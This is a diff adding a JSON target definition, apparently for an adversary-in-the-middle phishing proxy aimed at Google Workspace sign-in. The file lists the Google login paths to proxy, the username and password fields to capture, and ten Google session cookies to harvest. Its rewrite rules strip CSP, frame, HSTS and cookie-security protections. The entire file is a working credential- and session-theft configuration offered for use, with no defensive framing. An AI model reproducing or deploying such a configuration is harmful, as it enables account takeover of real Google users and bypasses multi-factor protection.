@@ -1,0 +1,39 @@
+{
+  "name": "google",
+  "label": "Google Workspace",
+  "upstream": "https://accounts.google.com",
+  "proxy_paths": [
+    "/",
+    "/signin/",
+    "/v3/signin/",
+    "/_/signin/",
+    "/ServiceLogin",
+    "/AccountChooser",
+    "/signin/challenge/",
+    "/signin/oauth/"
+  ],
+  "credential_fields": {
+    "username": ["identifier", "Email", "email", "username"],
+    "password": ["Passwd", "password", "PasswdHidden"]
+  },
+  "session_cookies": [
+    "SID",
+    "HSID",
+    "SSID",
+    "APISID",
+    "SAPISID",
+    "__Secure-1PSID",
+    "__Secure-3PSID",
+    "NID",
+    "OSID",
+    "LSID"
+  ],
+  "rewrite": {
+    "strip_csp": true,
+    "strip_xfo": true,
+    "strip_hsts": true,
+    "strip_cookie_secure": true,
+    "strip_cookie_domain": true,
+    "rewrite_location": true
+  }
+}
